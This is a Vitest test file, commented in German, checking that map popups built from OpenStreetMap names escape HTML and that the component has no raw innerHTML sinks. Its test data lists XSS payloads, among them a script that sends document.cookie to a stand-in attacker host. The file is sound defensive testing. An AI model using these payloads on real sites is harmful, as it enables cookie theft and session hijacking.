// Nr. 6: Namen aus OpenStreetMap dürfen in Karten-Popups keinen Code ausführen
import { describe, it, expect } from 'vitest'
import { readFileSync } from 'fs'
import { join } from 'path'
import { escapeHtml, poiPopupHtml } from '../src/lib/security/html'

const ANGRIFFE = [
  '<img src=x onerror=alert(1)>',
  '<script>fetch("https://evil.example/?c="+document.cookie)</script>',
  '"><svg onload=alert(1)>',
  "Pizza' onmouseover='alert(1)",
]

describe('escapeHtml', () => {
  it.each(ANGRIFFE)('maskiert %s', a => {
    const out = escapeHtml(a)
    expect(out).not.toMatch(/[<>"']/)
  })
  it('lässt normale Namen lesbar', () => {
    expect(escapeHtml('Pizzeria Da Mario & Söhne')).toBe('Pizzeria Da Mario &amp; Söhne')
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(42)).toBe('42')
  })
})

describe('POI-Popup', () => {
  it.each(ANGRIFFE)('kein ausführbares HTML aus dem Namen: %s', a => {
    const html = poiPopupHtml({ name: a, category: a, is_competitor: true })
    // Erlaubt sind nur die festen Tags des Popups
    const tags = html.match(/<[^>]+>/g) || []
    for (const t of tags) expect(t).toMatch(/^<\/?(b|br)( style="color:#7c6dfa")?>$/)
  })
  it('zeigt Name, Kategorie und Wettbewerber-Hinweis', () => {
    expect(poiPopupHtml({ name: 'Pizza Roma', category: 'restaurant', is_competitor: true }))
      .toBe('<b>Pizza Roma</b><br>restaurant<br><b style="color:#7c6dfa">⚡ Wettbewerber</b>')
    expect(poiPopupHtml({ name: 'Hotel Am Dom', category: 'hotel', is_competitor: false }))
      .toBe('<b>Hotel Am Dom</b><br>hotel')
  })
})

describe('Karte: keine unmaskierten Fremdtexte im HTML', () => {
  const src = readFileSync(join(__dirname, '../src/components/maps/AnalysisMap.tsx'), 'utf8')
  it('POI-Popup nutzt die maskierende Funktion', () => {
    expect(src).toContain('.bindPopup(poiPopupHtml(poi))')
    expect(src).not.toMatch(/\$\{poi\.(name|category)\}/)
  })
  it('PLZ, Straßenwerte und Marker werden maskiert', () => {
    expect(src).not.toMatch(/PLZ \$\{plz\}<\//)
    expect(src).not.toMatch(/\$\{entry\.(street_class|customer_count|order_count|rating_reason)/)
    // Popups bekommen nur fertig maskiertes HTML: aus poiPopupHtml() oder aus der Variablen html
    const popups = src.match(/\.bindPopup\(([^,)]+)/g) || []
    expect(popups.length).toBeGreaterThan(0)
    for (const p of popups) expect(p).toMatch(/\.bindPopup\((poiPopupHtml\(poi|html)$/)
    // jede eingesetzte Variable im Popup-HTML läuft durch escapeHtml oder ist eine feste Farbe/Zahl
    const htmlLines = src.split('\n').filter(l => /html \+?= `|row\('/.test(l))
    for (const l of htmlLines) for (const m of l.match(/\$\{[^}]+\}/g) || []) expect(m, l.trim().slice(0, 80)).toMatch(/^\$\{(escapeHtml\(|RATING_COLORS\[|k\}|v\}|addresses \?)/)
  })
  it('keine weiteren HTML-Einfallstore in den Komponenten', () => {
    const { execSync } = require('child_process')
    const hits = execSync('grep -rln "dangerouslySetInnerHTML\\|innerHTML\\|insertAdjacentHTML" src || true', { cwd: join(__dirname, '..') }).toString().trim()
    expect(hits).toBe('')
  })
})
